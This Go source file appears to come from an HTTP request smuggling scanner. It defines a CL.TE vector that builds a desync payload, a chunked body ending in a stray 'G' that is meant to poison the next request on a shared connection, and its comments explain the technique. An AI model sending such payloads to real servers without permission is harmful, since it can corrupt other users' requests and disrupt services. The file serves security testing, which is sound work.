package vectors

import (
	"github.com/byteoverride/desynctrace/internal/client"
)

type CLTEVector struct{}

func NewCLTEVector() *CLTEVector {
	return &CLTEVector{}
}

func (v *CLTEVector) Name() string {
	return "CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)"
}

func (v *CLTEVector) Type() VectorType {
	return CLTE
}

func (v *CLTEVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	// Basic CL.TE payload
	// Frontend sees Content-Length and forwards the whole body.
	// Backend sees Transfer-Encoding: chunked and stops processing after the 0 chunk.
	// The 'G' remains in the buffer and is prepended to the next request -> GPOST / HTTP/1.1 ...

	// We need to construct a body that looks like this:
	// 0\r\n
	// \r\n
	// G

	chunkedBody := "0\r\n\r\nG"

	req1 := &client.Request{
		Method: "POST",
		URL:    baseReq.URL,
		Headers: map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
			// We set Transfer-Encoding to chunked so backend (hopefully) parses it
			// But we manually set Content-Length for the frontend
		},
		TransferEncoding: "chunked",
		// Length of chunkedBody is 6.
		// Frontend sees 6, forwards all.
		// Backend sees chunked, reads 0\r\n\r\n, stops. 'G' is left over.
		Body:          []byte(chunkedBody),
		ContentLength: int64(len(chunkedBody)),
	}
	// Note: Our client.Request wrapper and fasthttp might fight us here.
	// fasthttp automatically handles TE and CL.
	// To send BOTH or specific conflicting ones, we might need to rely on the RawHeaders
	// or specific client tweaks we haven't fully implemented yet in the high-level client.
	// For now, let's assume the client can handle explicit ContentLength + TransferEncoding set.

	payloads = append(payloads, req1)

	return payloads
}

func (v *CLTEVector) Verify(resp *client.Response) bool {
	// Verification is complex and usually requires a follow-up request.
	// The vector itself might just provide the attack request.
	// The Detection Engine is responsible for sending the attack + victim request loop.
	// So Verify here might check for immediate errors (500/400) that hint at parsing issues,
	// but true confirmation comes from the detector.
	if resp.StatusCode >= 500 {
		return true // Suspicious
	}
	return false
}
